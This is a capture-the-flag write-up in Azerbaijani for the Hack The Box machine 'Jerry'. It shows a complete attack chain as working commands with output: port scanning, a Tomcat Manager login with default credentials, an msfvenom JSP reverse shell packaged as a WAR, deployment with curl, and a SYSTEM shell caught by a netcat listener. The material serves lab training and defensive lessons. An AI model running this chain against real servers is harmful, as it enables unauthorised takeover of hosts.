# Jerry (HTB)

> Platforma: Hack The Box  
> OS: Windows  
> Çətinlik: Asan  
> Nəticə: SYSTEM

---

## Hücum Zənciri

```text
Kəşfiyyat
├── nmap -p- --min-rate 5000 → 8080 (Apache Tomcat/Coyote JSP engine 1.1)
└── /manager/html açıqdır (401 Unauthorized, Basic realm="Tomcat Manager Application")

İlkin Giriş (Defolt Kredensiallar)
├── Defolt kredensiallar tomcat:<PASSWORD> /manager/html-də → 200 OK
├── msfvenom -p java/jsp_shell_reverse_tcp → shell.war
├── curl -u tomcat:<PASSWORD> --upload-file shell.war → /shell-ə deploy
└── JSP pеyload-unu işə salmaq → NT AUTHORITY\SYSTEM kimi reverse shell

Bayraqlar
├── C:\Users\Administrator\Desktop\flags\2 for the price of 1.txt
├── user.txt → <USER_FLAG>
└── root.txt → <ROOT_FLAG>
```

> [!NOTE]
> Bütün bayraqlar, şifrələr, heşlər və sessiya tokenləri etik səbəblərə görə gizlədilmişdir.

---

## Maşın Brifinqi

Jerry - Apache Tomcat 7.0.88 olan sadə Windows maşınıdır. Tomcat Manager tətbiqi Tomcat konfiqurasiya nümunələrində yaxşı sənədləşdirilmiş defolt kredensiallarla (`tomcat:<PASSWORD>`) qorunur. Autentifikasiyadan sonra menecer ixtiyari WAR (Web Application Archive) fayllarını yerləşdirməyə imkan verir. JSP reverse shell olan zərərli WAR yükləyərək hücumçu kod icrası əldə edir. Bu hostda Tomcat yüksək imtiyazlarla işlədiyi üçün shell `NT AUTHORITY\SYSTEM` kimi əldə edilir.

---

## Kəşfiyyat

### Port Skanı

```bash
ports=$(nmap -p- --min-rate=5000 -T4 -Pn -n jerry.htb -oG - | awk '/open/{for(i=4;i<=NF;i++){split($i,a,"/"); if(a[2]=="open") printf a[1]","}}' | sed 's/,$//'); echo "$ports"
```

```
8080
```

```bash
nmap -sC -sV -Pn -n -p 8080 jerry.htb
```

```
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Apache Tomcat
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/7.0.88
```

Xidmət - Apache Tomcat versiya 7.0.88. Veb interfeysi manager və host-manager tətbiqlər + i göstərir.

### Veb Kəşfiyyatı

`http://jerry.htb:8080/` ünvanına keçid standart Tomcat səhifəsini göstərir. `/manager/html` endpoint-i autentifikasiya tələb edir:

```bash
curl -s -i http://jerry.htb:8080/manager/html | head -10
```

```
HTTP/1.1 401 Unauthorized
Server: Apache-Coyote/1.1
WWW-Authenticate: Basic realm="Tomcat Manager Application"
```

Bu, Tomcat Manager-in mövcud olduğunu və Basic autentifikasiya ilə qorunduğunu təsdiqləyir.

---

## İlkin Giriş

No CVE (custom vulnerability) - the Apache Tomcat Manager is configured with default credentials `tomcat:<PASSWORD>`.

### Defolt Kredensiallar

Tomcat sənədləri və xəta mesajları bəzən bu cütlüyə nümunə kimi istinad edir. `/manager/html`-ə `tomcat:<PASSWORD>` ilə daxil olmaq cəhdi giriş verir:

```bash
curl -s -i -u tomcat:<PASSWORD> http://jerry.htb:8080/manager/html | head -10
```

```
HTTP/1.1 200 OK
Server: Apache-Coyote/1.1
Set-Cookie: JSESSIONID=<SESSION_ID>; Path=/manager; HttpOnly
Content-Type: text/html;charset=utf-8
```

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

### WAR Deploy

Manager interfeysi `.war` fayllarını qəbul edən "Deploy" bölməsini təqdim edir. `msfvenom` istifadə edərək zərərli WAR yaradırıq:

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.15.76 LPORT=4444 -f war -o shell.war
```

```
Payload size: 1091 bytes
Final size of war file: 1091 bytes
Saved as: shell.war
```

Listener işə salırıq:

```bash
nc -lvnp 4444
```

WAR-ı Manager vasitəsilə deploy edirik:

```bash
curl -u tomcat:<PASSWORD> --upload-file shell.war "http://jerry.htb:8080/manager/text/deploy?path=/shell&update=true"
```

```
OK - Deployed application at context path /shell
```

Arxivin içindəki JSP faylının adını müəyyən edirik:

```bash
jar tf shell.war
```

```
WEB-INF/
WEB-INF/web.xml
afhxosamxq.jsp
```

JSP faylını tələb edərək pеyload-u işə salırıq:

```bash
curl http://jerry.htb:8080/shell/afhxosamxq.jsp
```

Listener bağlantı alır:

```
connect to [10.10.15.76] from (UNKNOWN) [10.129.136.9] 49192
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\apache-tomcat-7.0.88>
```

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

### Səlahiyyətlərin Artırılması

Səlahiyyətlərin аrtırılması tələb olunmur. Tomcat xidməti `NT AUTHORITY\SYSTEM` kimi işləyir, buna görə də reverse shell artıq hostda maksimum imtiyazlara malikdir.

```cmd
whoami
```

```
nt authority\system
```

```cmd
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
```

```
OS Name:                   Microsoft Windows Server 2012 R2 Standard
OS Version:                6.3.9600 N/A Build 9600
```

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

---

## Bayraqlar

Hər iki bayraq `C:\Users\Administrator\Desktop\flags\` qovluğundadır:

```cmd
type "C:\Users\Administrator\Desktop\flags\2 for the price of 1.txt"
```

```
user.txt
<USER_FLAG>

root.txt
<ROOT_FLAG>
```

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

---

## Bayraqlar

| Bayraq | Dəyər          |
|--------|----------------|
| User   | `<USER_FLAG>`  |
| Root   | `<ROOT_FLAG>`  |

---

## Əsas Nəticələr

- **Defolt kredensiallar kritik riskdir.** `tomcat:<PASSWORD>` cütlüyü Tomcat nümunələrində sənədləşdirilib; onu açıq menecer interfeysində dəyişmədən saxlamaq autentifikasiyanın olmamasına bərabərdir.
- **WAR deploy daxili funksiyadır, zəiflik deyil.** Tomcat Manager tətbiqləri yerləşdirmək üçün nəzərdə tutulub. Əgər hücumçu giriş əldə edərsə, bu funksiya istismar vektoruna çevrilir.
- **Tomcat Windows-da tez-tez yüksək imtiyazlarla işləyir.** Tomcat vasitəsilə shell əldə etmək tez-tez `SYSTEM` verir və lokal səlahiyyət artımına ehtiyacı aradan qaldırır.
- **Hər iki bayraq bir fayldadır.** Jerry hər iki bayrağı (user və root) bir faylda (`2 for the price of 1.txt`) yerləşdirir ki, bu da hücumçu üçün nadir rahatlıqdır.
